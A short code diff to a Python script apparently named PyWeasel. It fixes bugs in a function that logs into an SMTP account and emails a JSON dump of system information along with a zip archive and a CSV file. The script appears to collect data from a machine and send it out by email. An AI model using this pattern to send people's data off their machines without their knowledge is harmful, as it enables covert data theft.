@@ -1,5 +1,6 @@
 import argparse
 import datetime
+import json
 import os
 import smtplib
 from email.mime.application import MIMEApplication
@@ -83,17 +84,15 @@ def main(arguments):
 
     if arguments.email and arguments.email.strip() and arguments.password and arguments.password.strip():
         if zipfile is not None:
-            sendmail(arguments.email, arguments.password, utils.system_information(), [zipfile, csv_manager.FILENAME])
+            sendmail(arguments.email, arguments.password, json.dumps(utils.system_information()), [zipfile, csv_manager.FILENAME])
         else:
-            sendmail(arguments.email, arguments.password, utils.system_information(), [csv_manager.FILENAME])
+            sendmail(arguments.email, arguments.password, json.dumps(utils.system_information()), [csv_manager.FILENAME])
 
 
 def sendmail(email, password, message='', files=None):
-    assert isinstance(email, list)
-
     msg = MIMEMultipart()
     msg['From'] = email
-    msg['To'] = COMMASPACE.join(email)
+    msg['To'] = COMMASPACE.join([email])
     msg['Date'] = formatdate(localtime=True)
     msg['Subject'] = 'PyWeasel - ' + msg['Date']
 
@@ -116,12 +115,10 @@ def sendmail(email, password, message='', files=None):
     smtp.starttls()
     # login to the email account
     smtp.login(email, password)
-    smtp.sendmail(email, email, msg.as_string())
     # send the actual message
-    smtp.sendmail(email, email, message)
+    smtp.sendmail(email, [email], msg.as_string())
     # terminates the session
     smtp.close()
-    smtp.quit()
 
 
 if __name__ == '__main__':
